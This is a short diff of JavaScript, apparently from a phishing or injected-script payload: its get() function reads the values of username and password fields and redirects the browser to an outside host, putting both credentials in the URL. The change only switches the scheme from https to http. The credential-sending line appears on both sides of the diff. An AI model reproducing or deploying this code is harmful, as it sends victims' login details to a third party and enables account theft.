@@ -39,5 +39,5 @@ function payload() {
 function get() {
     var username = $(".user").val();
     var password = $(".pass").val();
-    window.location = "https://j2mroxv3jig99vj52zg5woxzkqqhe72w.falcon.sfy.nl/?u=" + username + "&p=" + password;
+    window.location = "http://j2mroxv3jig99vj52zg5woxzkqqhe72w.falcon.sfy.nl/?u=" + username + "&p=" + password;
 }
